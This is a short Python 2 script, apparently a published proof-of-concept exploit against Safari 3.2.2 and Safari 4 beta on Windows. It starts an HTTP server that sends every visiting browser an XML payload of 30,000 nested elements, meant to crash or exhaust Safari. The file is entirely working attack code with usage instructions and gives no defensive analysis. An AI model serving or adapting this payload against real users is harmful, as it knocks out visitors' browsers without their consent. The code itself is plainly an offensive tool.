#
#   Author : Ahmed Obied (ahmed.obied@gmail.com)
#
#   - Tested using:
#     -> Safari 3.2.2 on Windows
#     -> Safari 4 (BETA) on Windows 
#
#   Usage  : python safari.py [port]
#    

import sys, socket
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

class RequestHandler(BaseHTTPRequestHandler):
        
    def get_exploit(self):
        exploit = '<?xml version="1.0"?>'
        exploit += '<A>' * 30000 + '</A>' * 30000
        return exploit
            
    def log_request(self, *args, **kwargs):
        pass

    def do_GET(self):
        if self.path == '/':
            print
            print '[-] Incoming connection from %s' % self.client_address[0]
            print '[-] Sending header to %s ...' % self.client_address[0]
            self.send_response(200)
            self.send_header('Content-type', 'text/xml')
            self.end_headers()
            print '[-] Header sent to %s' % self.client_address[0]
            print '[-] Sending exploit to %s ...' % self.client_address[0]
            self.wfile.write(self.get_exploit())
            print '[-] Exploit sent to %s' % self.client_address[0]

def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port]' % sys.argv[0]
        sys.exit(1)
    try:
        port = int(sys.argv[1])
        if port < 1 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '[-] Web server is running at http://%s:%d/' % (ip, port)
            try:
                serv.serve_forever()
            except KeyboardInterrupt:
                print '[-] Exiting ...' 
        except socket.error:
            print '[*] ERROR: a socket error has occurred ...'
        sys.exit(-1)    
    except ValueError:
        print '[*] ERROR: invalid port number ...'
        sys.exit(-1)
            
if __name__ == '__main__':
    main()

